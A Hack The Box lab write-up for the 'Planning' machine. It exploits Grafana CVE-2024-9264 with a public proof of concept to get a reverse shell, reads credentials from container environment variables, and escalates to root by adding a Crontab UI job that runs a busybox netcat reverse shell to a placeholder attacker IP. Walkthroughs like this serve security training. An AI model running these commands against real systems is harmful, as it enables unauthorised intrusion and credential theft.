---
tags:
  - HTB
  - Linux
  - Easy
  - RCE
  - Docker
  - Leakage
  - Forwarding
  - Cron
---
https://app.hackthebox.com/machines/Planning/
# Credentials
Before starting, we are given some **credentials**: `admin:0D5oT70Fq13EvB5r`
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.11.68 planning.htb grafana.planning.htb
```
# Scanning
```console
$ nmap -p22,80 -sV -sC planning.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Found subdomain `grafana.planning.htb`:
```console
$ gobuster vhost -q --append-domain -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -t 50

Found: grafana.planning.htb Status: 302 [Size: 29] [--> /login]
```
The subdomain website is a login panel to [Grafana](https://grafana.com/), which is an open-source application to monitor and analyze data.
# Exploitation
In the subdomain website, we can observe the current version, which is vulnerable to [CVE-2024-9264](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit):
```text
Grafana v11.0.0 (83b9528bce)
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Establish a reverse shell connection:
```console
$ git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit

$ cd CVE-2024-9264-RCE-Exploit/

$ python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip <ATTACKER-IP> --reverse-port <PORT>
```
# Post-Exploitation
## Docker Breakout
We are currently **root** but in a docker container.

Found credentials for **user enzo** in environment variables:
```console
$ printenv

AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
TERM=xterm
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/printenv
```
Connect as **user enzo** to the real target machine:
```bash
ssh enzo@planning.htb
```
Get the **user flag**:
```bash
cat /home/enzo/user.txt
```
## Privilege Escalation
**User enzo** is the only one in the system:
```console
$ grep 'sh$' /etc/passwd

root:x:0:0:root:/root:/bin/bash
enzo:x:1000:1000:Enzo Yamada:/home/enzo:/bin/bash
```
Using [LinPEAS](https://github.com/peass-ng/PEASS-ng/), found a **password** at `/opt/crontabs/crontab.db`:
```json
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
```
We can guess that the previous **password** belongs to **root** since we can not execute `/usr/bin/docker` or access `/root/scripts/cleanup.sh`. However, if we try to run `su root`, the password will be incorrect.

The port 8000 is opened internally and it usually contains a web server:
```console
$ ss -tulnp | awk '{print $5}'

Local
127.0.0.54:53
127.0.0.53%lo:53
127.0.0.1:3306
0.0.0.0:80
127.0.0.1:33060
127.0.0.53%lo:53
127.0.0.1:44637
127.0.0.1:3000
127.0.0.1:8000
127.0.0.54:53
*:22
```
Exit, then re-connect to the machine and forward port 8000 with SSH:
```bash
ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
```
Log in to the website using the **extracted credentials**: `root:P4ssw0rdS0pRi0T3c`. The service is called [Crontab UI](https://github.com/alseambusher/crontab-ui) and allows to modify system cronjobs via web. In fact, we can read and modify the cronjobs from `/opt/crontabs/crontab.db`.

So, we listen for connections:
```bash
nc -lvnp <PORT>
```
Now, using the UI, we create and execute a cronjob with the following command:
```bash
/usr/bin/busybox nc <ATTACKER-IP> <PORT> -e sh
```
Get the **root flag**:
```bash
cat /root/root.txt
```